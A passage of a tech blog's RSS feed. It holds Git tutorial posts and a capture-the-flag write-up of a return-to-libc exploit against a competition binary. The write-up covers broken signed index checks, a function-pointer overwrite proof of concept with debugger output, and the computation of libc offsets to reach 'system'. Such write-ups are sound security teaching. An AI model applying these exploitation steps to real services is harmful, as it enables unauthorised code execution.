<p>Should a commit not apply cleanly, Git stops the cherry-picking process and asks for human intervention. After the problems are resolved, you can continue it with <code>git cherry-pick --continue</code>. Or, you can abort it via <code>--abort</code> if you change your mind after seeing the trouble.</p>
</section>

    </div>
  </div>
</div>
]]></description>
    <pubDate>Fri, 22 Mar 2013 00:00:00 UT</pubDate>
    <guid>http://techblog.rosedu.org/git-is-the-answer-2.html</guid>
</item>
<item>
    <title>Git Is The Answer 1/3</title>
    <link>http://techblog.rosedu.org/git-is-the-answer-1.html</link>
    <description><![CDATA[<div class="unit-inner unit-article-inner">
  <div class="content">
    <div class="bd">
      <header>
        <div class="unit-head">
          <div class="unit-inner unit-head-inner">
            <h1 class="h2 entry-title">
              <a class="post_title" href="/git-is-the-answer-1.html" title="Git Is The Answer 1/3">Git Is The Answer 1/3</a>
            </h1>
          </div><!-- unit-inner -->
        </div><!-- unit-head -->
      </header>

      <span class="date">
      <span class="published">Published on March 18, 2013</span>
      by
      <span class="author">Răzvan Deaconescu and Mihai Maruseac</span>
      </span>

      <br/>
      <span class="meta">
        Tagged:
        <span class="tags"><a href="/tags/git.html">git</a></span>
      </span>

      <p>We focus again on <a href="http://git-scm.com/" title="Git">git</a>. This time, we will present some real-world scenarios where knoweldge of advance git topics helps. In order to keep down the length of the article, our presentation is divided in 3 parts, this being the first one of these.</p>
<section id="user-setup" class="level2">
<h2>User Setup</h2>
<p>After installing Git and before doing any commits into a repository, you must setup your user information and preferences. It is common to make a global configuration, using <code>git config</code>:</p>
<pre><code>git config --global user.name &quot;Razvan Deaconescu&quot;
git config --global user.email &quot;razvan.deaconescu@cs.pub.ro&quot;
git config --global color.ui auto</code></pre>
<p>You should make this setup for each account you are using. At the minimum, you are going to use it at least for your laptop or workstation.</p>
<p>Global configuration is stored in <code>~/.gitconfig</code>.</p>
<p>In case you want to use another username within a repository, use the <code>git config</code> command in that repository, but without the <code>--global</code> option:</p>
<pre><code>cd /path/to/repository.git
git config user.email &quot;razvan@rosedu.org&quot;</code></pre>
<p>In the above setup, I have only updated the email address for the repository. The other options used are picked from the global configuration.</p>
<p>Per repository configuration is stored in <code>/path/to/repository.git/.config</code>.</p>
</section>
<section id="handling-line-endings-like-a-pro" class="level2">
<h2>Handling Line Endings Like a Pro</h2>
<p>From time to time it is possible that you will have to work with people working on a different operating system. It is no problem if both of you are using systems with similar line-endings (<code>CRLF</code> for Windows, <code>LF</code> for Linux/OSX). In all other cases, it might be that the default Git options used for this don’t work for you.</p>
<p>You can configure Git globally to handle line-endings if you set the <code>core.autocrlf</code> option in your <code>~/.gitconfig</code>. However, the best settings are different on different platforms.</p>
<p>For Windows you would use</p>
<pre><code>git config --global core.autocrlf true</code></pre>
<p>While for Linux/OSX you would use</p>
<pre><code>git config --global core.autocrlf input</code></pre>
<p>You must remember that these changes are valid only for you, and for the operating systems which have these settings configured. To have the settings travel with the repository you have to go a different path: you have to create a <code>.gitattributes</code> file with a content similar to</p>
<pre><code>* text=auto
*.c text
*.h text
*.sln text eol=crlf
*.png binary
*.jpg binary</code></pre>
<p>The first line tells git to handle the line endings of all <strong>text</strong> files automatically. The second two lines declare that <code>.c</code> and <code>.h</code> files are to be treated as text (thus their line endings are to be converted to the proper format). The <code>.sln</code> line uses a new parameter (<code>eol=crlf</code>) which tells Git to normalize files on commit but to always checkout them with <code>CRLF</code> endings. Use this for files which need to have <code>CRLF</code> endings, even on Linux. A similar settings exists for <code>LF</code> endings.</p>
<p>Finally, there are cases when you need to commit binary files into the repository. In this cases, changing <code>LF</code> characters to <code>CRLF</code> or the reverse will break the binary. You have to tell Git not to handle them, thus you’ll specify <code>binary</code> in <code>.gitattributes</code> file.</p>
<p>If the repository already contained some files commited, after creating the <code>.gitattributes</code> file each of you will have files show up as modified, even if they haven’t changed. This is because of the line endings changes which was not followed by repository renormalization. To solve this, you have to do the following steps (on a <strong>clean</strong> repository, otherwise changes will be lost).</p>
<p>First, remove everything from the index and reset both the index and the working directory (the risky part):</p>
<pre><code>git rm --cached -r .
git reset --hard</code></pre>
<p>Finally, stage all files which were normalized and create a normalizing commit</p>
<pre><code>git add .
git commit -m &quot;Normalized line endings&quot;</code></pre>
<p>From now on, Git will properly do the job of handling line endings for you.</p>
</section>
<section id="how-to-create-and-setup-a-local-repo" class="level2">
<h2>How to Create and Setup a Local Repo</h2>
<p>One of the best features of Git is the ability to rapidly create and use local repositories. You don’t have to create a repository and then clone it locally as you do in Subversion. You just create or access a directory and then initialize it as a Git repository. Changes to files in the directory will be able to be handled as commits.</p>
<p>Assuming I am working on a personal project, the first thing I would do is create a directory and initialize it as a Git repository. I recommend you append the <code>.git</code> extension:</p>
<pre><code>mkdir ~/projects/troscot.git
git init ~/projects/troscot.git</code></pre>
<p>The first thing you add in a repository is a <code>.gitignore</code> file stating the files you wish to ignore. Such a sample file is <a href="https://github.com/razvand/snippets/blob/master/config/gitignore" title="gitignore file">here</a>.</p>
<p>You just create the <code>.gitignore</code> file in the repository root and then add it to the repository:</p>
<pre><code>vi .gitignore
git add .gitignore
git commit -m &#39;Initial commit. Add global .gitignore file&#39;</code></pre>
<p>After this, one would create, add and commit any files required.</p>
<p>Another use case is adding repository support for existing directories. This may happen when there is some pieces of code you already have in place and want to place in a repository or, my personal use case, adding repository support to configuration directories. For example, if one would want to use versioning for Apache2 configuration files, one would issue (as <code>root</code>):</p>
<pre><code>cd /etc/apache2/
git init .
vi .gitignore
git add .gitignore
git commit -m &#39;Initial commit. Add global .gitignore file&#39;
git add .
git status
git commit -m &#39;Initial commit. Add all config files to repository&#39;</code></pre>
<p>The above commands add a <code>.gitignore</code> file in the repository and then add all Apache2 configuration files. The <code>git status</code> command is always necessary after a <code>git add</code> command to make sure you are committing the right stuff; you may need to update your <code>.gitignore</code> file in case you’ve missed ignoring certain types of files.</p>
</section>
<section id="i-want-to-tweak-a-commit" class="level2">
<h2>I Want To Tweak A Commit</h2>
<p>From time to time you realize that you have made something wrong with a commit. Either you forgot to add a good, descriptive <a href="http://tbaggery.com/2008/04/19/a-note-about-git-commit-messages.html" title="A Note About Git Commit Messages">message</a> or you have really screwed up some parts of the committed code. Maybe you have some compile errors to fix or your commit does too many things at once.</p>
<p>Anyway, for all of these cases, Git allows you to rewrite the commit at will. You can add changes of tweak metadata (author name, commit message, etc.) just by issuing the needed commands and ending with</p>
<pre><code>git commit --amend</code></pre>
<p>However, this works only for the tip of the current branch. If you want to change a commit which is not HEAD, you’ll need to do a rebase process. This will temporarily move HEAD to the commit you want to change, allowing you to use the above procedure. It is best to start the rebase interactively, so that you can have great control over what it does:</p>
<pre><code>git rebase -i cf80a4ad6d64bff2</code></pre>
<p>The above will open your editor (configurable via <code>git config</code>) with a content similar to the following one (you can see it on the disk if you really want to, it is in the repository, in <code>.git/rebase/git-rebase-todo</code>)</p>
<pre><code>pick 899e7e6 Add Silviu&#39;s contributions.
pick 02f1ef9 Add contribs to Cristian Mocanu.
pick 98194cd Add contributions of Andru Gheorghiu.
pick 2931f1d Add 2 contributions of spopescu.

# Rebase cf80a4a..2931f1d onto cf80a4a
#
# Commands:
#  p, pick = use commit
#  r, reword = use commit, but edit the commit message
#  e, edit = use commit, but stop for amending
#  s, squash = use commit, but meld into previous commit
#  f, fixup = like &quot;squash&quot;, but discard this commit&#39;s log message
#  x, exec = run command (the rest of the line) using shell
#
# These lines can be re-ordered; they are executed from top to bottom.
#
# If you remove a line here THAT COMMIT WILL BE LOST.
#
# However, if you remove everything, the rebase will be aborted.
#
# Note that empty commits are commented out</code></pre>
<p>As you can see, you can select an action to be applied for each one of the commits. If you only want to edit the commit message, you will change <code>pick</code> with <code>reword</code> (or <code>r</code>). If you want to edit the content of the commit you will select <code>edit</code>. You can even reorder commits, squash them one a bigger one, etc.</p>
<p>For now, we will focus on editing the contents of one commit. We will change last line in <code>edit</code>.</p>
<pre><code>e 2931f1d Add 2 contributions of spopescu.</code></pre>
<p>The rebase process continues and tries to do what we’ve said it to do. In our case, it will stop at commit <code>2931f1d</code> to allow editing it:</p>
<pre><code>Stopped at 2931f1d... Add 2 contributions of spopescu.
You can amend the commit now, with

    git commit --amend

Once you are satisfied with your changes, run

    git rebase --continue</code></pre>
<p>Now, you can add or remove content, change the commit as you want, etc. Then, you continue the rebase process by running <code>git commit --amend</code> followed by <code>git rebase --continue</code>. Both of them are needed.</p>
<p>If you decide that the commit is ok and that the rebase was not neeeded, you can always abort it with <code>git rebase --abort</code>.</p>
<p>Finally, keep in mind that <strong>it is not recommended to change commits once they have been pushed to another repository.</strong></p>
</section>
<section id="but-my-commit-is-too-big" class="level2">
<h2>But My Commit Is Too Big</h2>
<p>From time to time, you will have some big changes to commit. However, the case when all of them are atomic and cannot be split into several shorter components is very rare. Let’s take for our example a LaTeX Beamer file. You can commit each section separately or even each slide, as you see fit. But how can you split the commit?</p>
<p>Actually, you can use two commands for this. One is <code>git add -i</code> to allow interactive adding of parts of commits. The second one is to use <code>git add -p</code> which is more simpler.</p>
<p>Running <code>git add -p</code> will present you with the first chunk of changes to be committed. It might be the case that this is chunk is atomic or not. Git offers this question after presenting the hunk:</p>
<pre><code>Stage this hunk [y,n,q,a,d,/,e,?]?</code></pre>
<p>Selecting <code>?</code> will print the help text and the chunk afterwards. The help text is</p>
<pre><code>y - stage this hunk
n - do not stage this hunk
q - quit; do not stage this hunk nor any of the remaining ones
a - stage this hunk and all later hunks in the file
d - do not stage this hunk nor any of the later hunks in the file
g - select a hunk to go to
/ - search for a hunk matching the given regex
j - leave this hunk undecided, see next undecided hunk
J - leave this hunk undecided, see next hunk
k - leave this hunk undecided, see previous undecided hunk
K - leave this hunk undecided, see previous hunk
s - split the current hunk into smaller hunks
e - manually edit the current hunk
? - print help</code></pre>
<p>Now, you can use these options to split your commit or edit it. Editing is the most advanced feature of <code>git add -p</code>, the only one who needs more explaining. So let’s choose this.</p>
<pre><code>Stage this hunk [y,n,q,a,d,/,e,?]? e</code></pre>
<p>Again, we will be presented with an editor to edit the contents of <code>.git/addp-hunk-edit.diff</code>. The comment at the end of the file is self-explanatory:</p>
<pre><code># To remove &#39;-&#39; lines, make them &#39; &#39; lines (context).
# To remove &#39;+&#39; lines, delete them.
# Lines starting with # will be removed.
#
# If the patch applies cleanly, the edited hunk will immediately be
# marked for staging. If it does not apply cleanly, you will be given
# an opportunity to edit again. If all lines of the hunk are removed,
# then the edit is aborted and the hunk is left unchanged.</code></pre>
<p>The <code>-</code> lines are lines which will be removed by the commit and the <code>+</code> ones will be added. Thus, if you remove a <code>+</code> line, the commit will not contain the addition and if you mark one <code>-</code> line as context it won’t be removed by the commit.</p>
<p>Since <code>git add -p</code> is a powerful feature, it is advisable to have it added as an alias, via <code>git config</code>. For example, I have <code>git gap</code> do the same thing as <code>git alias -p</code>. Then, it is in my muscles’ memory to type <code>git gap</code> when adding changes for a new commit.</p>
</section>
<section id="i-dont-want-this-commit-anymore" class="level2">
<h2>I Don’t Want This Commit Anymore</h2>
<p>There is often the case that you want to rollback a change you’ve done. As long as everything is happening locally (i.e. you haven’t pushed to a remote repository), Git offers the proper tools to handle this.</p>
<p>Assume you’ve updated a file but you want to discard those changes. You’ve just done some tests and feel those are not required and want to get back to the initial version. Then you would issue</p>
<pre><code>git checkout file-name</code></pre>
<p>This above command restores the file to the repository version. It’s very useful in case you make a mess in a local file.</p>
<p>A quite often situation is preparing to make a commit. When you do that you use one or more <code>git add</code> commands to prepare the commit; sometimes you use a <code>git add .</code> command that gives you little control on what to add to the staging area. You find out that you’ve added too much content to the staging area. In order to remove that extra content from the staging area (and leave it in the working directory), one issues:</p>
<pre><code>git reset HEAD file-name</code></pre>
<p>If you want to start building your commit from the beginning and discard all information in the staging area, you would use:</p>
<pre><code>git reset HEAD</code></pre>
<p>When leaving out the file name, all content from the staging area is discarded.</p>
<p>Consider that you’ve done some bad commits and you’ve just found out. The last two commits are really bad and need to be dropped. As long as you haven’t pushed anything, you can rework those commits: you can reset the repository HEAD and leave the commit changes in the working directory. If we want to redo the last two commits we would just issue:</p>
<pre><code>git reset HEAD^^</code></pre>
<p>Remember, this doesn’t remove the commit changes. The repository HEAD is simply moved back and the commit changes are left in the working directory; you will then use them to create proper new commits.</p>
</section>
<section id="i-want-to-change-this-file-silently" class="level2">
<h2>I Want To Change This File Silently</h2>
<p>GitHub has an excellent article on <a href="https://help.github.com/articles/ignoring-files" title="GitHub: Ignoring files">ignoring files</a>. A particular situation is ignoring updates to files that are already in the repository (i.e. they’ve been previously commited and can’t be ignored using .gitignore).</p>
<p>This kind of situation is part of my repository with letters of recommendation. I’m using a Makefile for compiling out a letter and have isolated in it some variables:</p>
<pre><code>$ cat Makefile
PERSON = Alexandru_Juncu
FOLDER = alexandru-juncu

include base.mk</code></pre>
<p>When I would create a new recommendation I update the <code>Makefile</code> to compile it. However this change needn’t make it to the repository. If I would do that then each time I’m only compiling out an old letter of recommendation I would change the Makefile file and push the new changes; or, if I don’t want to push those changes, I would need to use <code>git checkout</code>.</p>
<p>The best solution would be for any updates to the Makefile to not be considered. The initial Makefile file would be stored in the repository (as a model) but subsequent changes should not be visible. This can be done by using:</p>
<pre><code>git update-index --assume-unchanged Makefile</code></pre>
<p>No changes on the <code>Makefile</code> file are going to be considered in the working directory.</p>
<p>If you want to revert this option, use:</p>
<pre><code>git update-index --no-assume-unchanged Makefile</code></pre>
</section>

    </div>
  </div>
</div>
]]></description>
    <pubDate>Mon, 18 Mar 2013 00:00:00 UT</pubDate>
    <guid>http://techblog.rosedu.org/git-is-the-answer-1.html</guid>
</item>
<item>
    <title>GiTS 2013 CTF -- return-to-libc -- pwnable 250</title>
    <link>http://techblog.rosedu.org/ctf-return-to-libc.html</link>
    <description><![CDATA[<div class="unit-inner unit-article-inner">
  <div class="content">
    <div class="bd">
      <header>
        <div class="unit-head">
          <div class="unit-inner unit-head-inner">
            <h1 class="h2 entry-title">
              <a class="post_title" href="/ctf-return-to-libc.html" title="GiTS 2013 CTF -- return-to-libc -- pwnable 250">GiTS 2013 CTF -- return-to-libc -- pwnable 250</a>
            </h1>
          </div><!-- unit-inner -->
        </div><!-- unit-head -->
      </header>

      <span class="date">
      <span class="published">Published on February 19, 2013</span>
      by
      <span class="author">Lucian Cojocar</span>
      </span>

      <br/>
      <span class="meta">
        Tagged:
        <span class="tags"><a href="/tags/exploit.html">exploit</a>, <a href="/tags/ctf.html">ctf</a>, <a href="/tags/return-to-libc.html">return-to-libc</a>, <a href="/tags/strace.html">strace</a>, <a href="/tags/debugging.html">debugging</a>, <a href="/tags/gdb.html">gdb</a>, <a href="/tags/write-up.html">write-up</a></span>
      </span>

      <section id="introduction" class="level1">
<h1>Introduction</h1>
<p>This is a write-up for Pwnable 250 level from <a href="http://ghostintheshellcode.com/" title="Ghost in the Shellcode CTF">Ghost in the Shellcode</a> capture the flag competition. Basically a return-to-libc attack will be described; we will also describe the steps for solving the mentioned CTF level using the <a href="res/back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f" title="Vulnerable binary">original binary</a> from the competition.</p>
</section>
<section id="hello-binary" class="level1">
<h1>Hello binary!</h1>
<p>Let’s start by inspecting the binary.</p>
<ul>
<li><p>32bit dynamically linked binary</p>
<pre><code>$ file ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f
./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f: ELF 32-bit LSB executable, ...</code></pre></li>
<li><p>it waits for connections on port 31337</p>
<pre><code>$ strace -f ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f
	[...]
setsockopt(3, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
bind(3, {sa_family=AF_INET, sin_port=htons(31337), sin_addr=inet_addr(&quot;0.0.0.0&quot;)}, 16) = 0
listen(3, 20)                           = 0
accept(3, </code></pre></li>
</ul>
<p><code>SO_REUSEADDR</code> is used, just for <em>easy</em> debugging ;-) - it allows other sockets to <code>bind()</code> this port; no more getting the annoying error <em>Address already in use</em> after the server crashes.</p>
<pre><code>$ telnet localhost 31337
Trying ::1...
Trying 127.0.0.1...
Connected to localhost.
Escape character is &#39;^]&#39;.
Connection closed by foreign host.
$</code></pre>
<p>It immediately drops connection.</p>
<p>Let’s have a look at what happens when we are connecting to it.</p>
<pre><code>$ ltrace -f ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f
[...]
[pid 4359] accept(3, 0, 0, 0x697a0002, 1)                                           = 4
[pid 4359] fork()                                                                   = 4361
[pid 4359] close(4)                                                                 = 0
[pid 4359] accept(3, 0, 0, 0x697a0002, 1 &lt;unfinished ...&gt;
[pid 4361] &lt;... fork resumed&gt; )                                                     = 0
[pid 4361] getpwnam(&quot;back2skool&quot;)                                                   = NULL
[pid 4361] err(-1, 0x804997b, 0x80499b8, 0, 0back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f:
Failed to find user back2skool: Success
 &lt;unfinished ...&gt;
[pid 4361] +++ exited (status 255) +++</code></pre>
<p>In short, <code>getpwnam</code> fails, and the forked child exits. It also prints a conclusive error - the user <code>back2skool</code> is required.</p>
<p>Usually, the <em>first</em> step, when trying to solve a remote challenge is to debug it locally. Of course this is possible as long as we can run the application ourselves.</p>
<p>After we setup the user we can see the following output when connecting:</p>
<pre><code>$ telnet localhost 31337
Trying ::1...
Trying 127.0.0.1...
Connected to localhost.
Escape character is &#39;^]&#39;.
    __  ___      __  __   _____
   /  |/  /___ _/ /_/ /_ / ___/___  ______   __ v0.01
  / /|_/ / __ `/ __/ __ \\__ \/ _ \/ ___/ | / /
 / /  / / /_/ / /_/ / / /__/ /  __/ /   | |/ /
/_/  /_/\__,_/\__/_/ /_/____/\___/_/    |___/
===============================================
Welcome to MathServ! The one-stop shop for all your arithmetic needs.
This program was written by a team of fresh CS graduates using only the most
agile of spiraling waterfall development methods, so rest assured there are
no bugs here!

Your current workspace is comprised of a 10-element table initialized as:
{ 0, 1, 2, 3, 4, 5, 6, 7, 8, 9 }

Commands:
	read	Read value from given index in table
	write	Write value to given index in table
	func1	Change operation to addition
	func2	Change operation to multiplication
	math	Perform math operation on table
	exit	Quit and disconnect
exit
Exiting program!
Connection closed by foreign host.
$</code></pre>
</section>
<section id="the-vulnerability" class="level1">
<h1>The vulnerability</h1>
<section id="high-level" class="level4">
<h4>High-level</h4>
<p>The output of the program is self-explanatory. Let’s try some commands.</p>
<pre><code>$ telnet localhost 31337
read
Input position to read from:
3</code></pre>
<p>Nothing special.</p>
<pre><code>Input position to read from:
10
Value at position 10: 134519224</code></pre>
<p>We can read <strong>past</strong> our table!</p>
<pre><code>Input position to read from:
-200
Value at position -200: 0</code></pre>
<p>We can read <strong>below</strong> our table!</p>
<pre><code>read
Input position to read from:
90000
Connection closed by foreign host.</code></pre>
<p>The program received <code>SIGSEGV</code> and the socket was closed. At least we can crash the program; in fact we are only crashing the child that has been spawned to handle our connection.</p>
<p>But what about write?</p>
<pre><code>$ telnet localhost 31337
write
Input position to write to:
0
Input numeric value to write:
1
Value at position 0: 1</code></pre>
<p>Nothing special.</p>
<pre><code>write
Input position to write to:
10
Table index too large!</code></pre>
<p>Bummer, we cannot <strong>write past</strong> our table!</p>
<pre><code>write
Input position to write to:
-1
Input numeric value to write:
42
Value at position -1: 42
write
Input position to write to:
-10000 
Input numeric value to write:
999
Connection closed by foreign host.</code></pre>
<p>Heh, we can <strong>write below</strong> our table!</p>
</section>
<section id="low-level" class="level4">
<h4>Low-level</h4>
<p>The assembly code, responsible for checking the indices can be viewed below. <img style="float:center" src='/images/ida-atoi-read.png' alt="Read - atoi"/></p>
<p>As you can <em>not</em> see, there is no check code for the index when we’re doing a <em>read</em> operation.</p>
<p><img style="float:center" src='/images/ida-atoi-write.png' alt="Write - atoi"/></p>
<p>For the <em>write</em> operation there is checking using the instruction <code>jle</code>. But <code>jle</code> instruction is used for comparing <em>signed</em> integers. The instruction <code>jbe</code> should be used in this case which compares <em>unsigned</em> integers. You can find more on this <a href="http://en.wikibooks.org/wiki/X86_Assembly/Control_Flow#Jump_if_Less">wiki article</a>. Probably the original code looks something like this:</p>
<pre class="sourceCode cpp"><code class="sourceCode cpp"><span class="dt">int</span> i;
i = atoi(str);
<span class="kw">if</span> (i &gt; <span class="dv">9</span>) {
	error();
	exit();
}
do_stuff;</code></pre>
<p>One way to correct the above code is to have an unsigned comparison or check for negative values. Both would work in this case, but then we couldn’t solve this level :-).</p>
<p>In short, the <strong>index checking</strong> is <strong>broken</strong>. We can use any index for the <strong>read</strong> operation and for the <strong>write</strong> only negative indices. When you can write anything to any address of a program, the rest is just implementation.</p>
</section>
</section>
<section id="the-exploit" class="level1">
<h1>The exploit</h1>
<p>As explained in the previous section we can modify <em>almost</em> any address from our vulnerable program. In order to choose a right way to exploit the vulnerability, we should gather more information about the environment.</p>
<section id="do-we-have-any-rwx-place-to-store-the-payload" class="level3">
<h3>Do we have any RWX place to store the payload?</h3>
<pre><code>$ readelf -e ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f 
ELF Header:
  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 
[...]

Program Headers:
  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
  PHDR           0x000034 0x08048034 0x08048034 0x00120 0x00120 R E 0x4
  INTERP         0x000154 0x08048154 0x08048154 0x00013 0x00013 R   0x1
      [Requesting program interpreter: /lib/ld-linux.so.2]
  LOAD           0x000000 0x08048000 0x08048000 0x022a8 0x022a8 R E 0x1000
  LOAD           0x002e68 0x0804be68 0x0804be68 0x00204 0x00214 RW  0x1000
  DYNAMIC        0x002e7c 0x0804be7c 0x0804be7c 0x000d8 0x000d8 RW  0x4
  NOTE           0x000168 0x08048168 0x08048168 0x00044 0x00044 R   0x4
  GNU_EH_FRAME   0x001e94 0x08049e94 0x08049e94 0x000c4 0x000c4 R   0x4
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4
  GNU_RELRO      0x002e68 0x0804be68 0x0804be68 0x00198 0x00198 R   0x1
[...]</code></pre>
<p>The short answer is <strong>no</strong> - there is no <code>RWE</code> section in the binary. We cannot modify a memory that will be executed later. Maybe we can put our exploit in some region and then make this region executable. This means that we should be able to call <code>mprotect</code> or <code>mmap</code>. But we’ll have to do this, without injecting code, but only by changing non-executable data - e.g. stack values. One idea is to use a <a href="http://en.wikipedia.org/wiki/Return-oriented_programming">return-oriented-programming (ROP) approach</a>, but as you will see in a future section, because our program doesn’t use <code>mprotect</code> or <code>mmap</code> (from libc), calling those functions means that we will have to figure out the offsets of those functions in libc first - if we do this, we can have a more straightforward approach by calling <code>system</code> function directly.</p>
</section>
<section id="is-aslr-enabled" class="level3">
<h3>Is ASLR enabled?</h3>
<p>It is safe to assume that <a href="http://en.wikipedia.org/wiki/Address_space_layout_randomization#Linux">ASLR</a> is enabled. But because we will use some sort of ROP, we don’t care too much about this right now.</p>
</section>
<section id="where-shall-we-write" class="level3">
<h3>Where shall we write?</h3>
<p>In order to modify the flow control of the program by only changing non-executable memory, we will have to find an <strong>indirect jump</strong> and change the value from that specific address. <a href="http://althing.cs.dartmouth.edu/secref/resources/plt-got.txt">GOT</a> is the starting point for this.</p>
<p>The idea that comes to our mind is: we will write (override) an address of function which is called later from the GOT. The GOT table is always at the same place in the memory (it resides in the binary) but recall, that we’re writing relatively to a buffer (the workspace table). So the next question that comes in our mind is:</p>
</section>
<section id="do-we-know-the-address-of-the-buffer" class="level3">
<h3>Do we know the address of the buffer?</h3>
<p>There are three cases where the buffer might be located:</p>
<ul>
<li>on the stack. If ASLR is enabled, figuring out its address can be done by reading an old <code>%ebp</code>, which is possible because we can read parts of the memory relative to the buffer address;</li>
<li>on the heap. This is harder to get. But if our buffer is on the heap, and we can alter structures that are used internally by the malloc function (and we can, because the negative offset write) there is a way of exploiting. We can do something like in the case of <a href="https://www.owasp.org/index.php/Double_Free">double-free vulnerability</a> - but it would be a tedious job;</li>
<li>declared global (<code>.bss</code> or <code>.data</code> section). The address of the buffer is the same as in the binary, no runtime hazards.</li>
</ul>
<p>Probably because pwn250 is <strong>not</strong> the hardest level, the buffer is in the <code>.data</code> section.</p>
<p><img style="float:center" src='/images/ida-values.png' alt="Values buffer"/></p>
<p>Because our buffer is in <code>.data</code> section and we can use negative indices for read and write, we have a <strong>good</strong> control over the memory <strong>below</strong> our buffer. Moreover, you can see in the <a href="https://www.hex-rays.com/products/ida/index.shtml">IDA</a> screenshot above, that there’s a <code>math</code> variable. The program is capable of switching from one operation (addition) to another one (multiplication) it does so by changing a pointer to a function. The pointer is in the <code>.bss</code> section.</p>
<p><img style="float:center" src='/images/ida-indirect-jump.png' alt="Indirect jump via math_ptr"/></p>
<p>I know at this point, one might argue that the authors of the program used this pointer to facilitate the problem solving - it’s true I wouldn’t argue against this - it’s just a game.</p>
<p>So <strong>let’s state our idea</strong>: we will override a pointer to a function which is called later; the function will be called whenever the <code>math</code> function is called.</p>
</section>
<section id="first-poc" class="level2">
<h2>First <a href="http://en.wikipedia.org/wiki/Proof_of_concept">PoC</a></h2>
<pre><code>$ telnet localhost 31337
[...]
math
You haven&#39;t set a mode yet!
func1
Setting mode to ADDITION
write
Input position to write to:
-2147483634
Input numeric value to write:
286331153
Value at position -2147483634: 286331153
math
Connection closed by foreign host.
$</code></pre>
<p>Meanwhile, back at the castle.</p>
<pre><code>$ strace -f ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f
[...]
[pid  4710] recv(4, &quot;\n&quot;, 1, 0)         = 1
[pid  4710] send(4, &quot;Value at position -2147483634: 2&quot;..., 41, 0) = 41
[pid  4710] read(4, &quot;m&quot;, 1)             = 1
[pid  4710] read(4, &quot;a&quot;, 1)             = 1
[pid  4710] read(4, &quot;t&quot;, 1)             = 1
[pid  4710] read(4, &quot;h&quot;, 1)             = 1
[pid  4710] read(4, &quot;\r&quot;, 1)            = 1
[pid  4710] read(4, &quot;\n&quot;, 1)            = 1
[pid  4710] --- SIGSEGV (Segmentation fault) @ 0 (0) ---
Process 4710 detached
$</code></pre>
<p>OK, we’ve got our segmentation fault. Let’s see what was the last instruction pointer.</p>
<pre><code>$ gdb ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f /home/back2skool/core 
[...]
Core was generated by `./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f&#39;.
Program terminated with signal 11, Segmentation fault.
#0  0x11111111 in ?? ()
(gdb) </code></pre>
<p>Neat! But what are those numbers? We wrote at position <strong>-2147483634</strong> value <strong>286331153</strong>. The second number is the instruction pointer at which we want to jump with the <code>math</code> function. The first number is computed as follows</p>
<ul>
<li>the base of our buffer (values) is at a fixed address 0x804c040</li>
<li>the address at which we want to write is 0x804c078</li>
<li>we need to write at position values+0x38</li>
<li>giving a positive index (0x38/4) will give an upper bound error</li>
<li>the negative index is -(2^31 - (0x38/4)) == <strong>-2147483634</strong></li>
<li>you can test this by computing 2^33 + 0x804c040-4*(2^31 - (0x38/4)) - because of the way the buffer is addressed (4 bytes values, <a href="http://en.wikipedia.org/wiki/Addressing_mode#Scaled">scaled addressing</a>) the overflow is ignored and the index value <em>wraps</em> around. We need to do <em>wrap</em> around only when we try to access a value above the base address of the vector.</li>
</ul>
<p>The instruction pointer is the value that we wrote, 0x11111111 in decimal is <strong>286331153</strong>, so we’ve managed to modify the flow of the program by doing a write, and we’ve managed to do so in a predictable way.</p>
</section>
<section id="second-poc" class="level2">
<h2>Second PoC</h2>
<p>We are in the following state: we’ve managed to make our program to jump at any location. But <strong>where</strong> to jump? Because we don’t have any possibility of injecting code, we should rely on the available code. Available code means, our code and the dynamic libraries code which are mapped in our address space.</p>
<p>Let’s inspect again our binary to see what is used from shared libraries.</p>
<pre><code>$ nm -D -u ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f 
         w __gmon_start__
         U __libc_start_main U __stack_chk_fail U accept U atoi U bind
         U chdir U close U err U exit U fork U free U getpwnam U htonl
         U htons U listen U perror U read U recv U send U setgid
         U setgroups U setsockopt U setuid U signal U socket U vasprintf
$ </code></pre>
<p>Hmm, nothing useful, nothing to execute, nothing to modify the mappings. But hey, if you have access to those functions from libc and because the loader maps the libc to our address space then it means that we have access to other functions from libc, the problem is that we don’t know where they are. A wild <strong>idea appears</strong>, if we knew where one of the function from libc is, we can compute the rest of them by adding some offsets. There are two problems with this idea: <strong>how do we find the offset of a used function</strong> and <strong>how do we compute the offset of an unused function</strong>.</p>
<ul>
<li><p>finding the address of a used function is <strong>simple</strong>, we can use the GOT and read the value of the pointer which has been already filled in by the loader. Because of the lazy linking, we only have to be careful to choose a function which has been previously called. We will choose <code>recv</code> for this purpose.</p>
<pre><code>$ objdump -dS ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f  | grep -A2 recv@plt
08048980 &lt;recv@plt&gt;:
 8048980:	ff 25 c0 bf 04 08    	jmp    *0x804bfc0</code></pre></li>
</ul>
<p><strong>0x804bfc0</strong> is the GOT entry for <code>recv</code> function.</p>
<ul>
<li><p>finding the relative offset of the function that we want to jump to (e.g. <code>system</code>) is <strong>difficult</strong>. This offset depends on the version of libc that is used on the target system. To make things simple, we will focus first on exploiting locally - meaning that we have access to our libc file. To compute the offset we only have to find the function entries in libc.</p>
<pre><code>$ readelf -s /lib/tls/i686/cmov/libc.so.6 | grep &#39; recv@&#39;
  1124: 000cebf0   118 FUNC    WEAK   DEFAULT   12 recv@@GLIBC_2.0
$ readelf -s /lib/tls/i686/cmov/libc.so.6 | grep &#39; system@&#39;
  1398: 00039100   125 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0
$ echo $((0x00039100-0x000cebf0))
-613104</code></pre></li>
</ul>
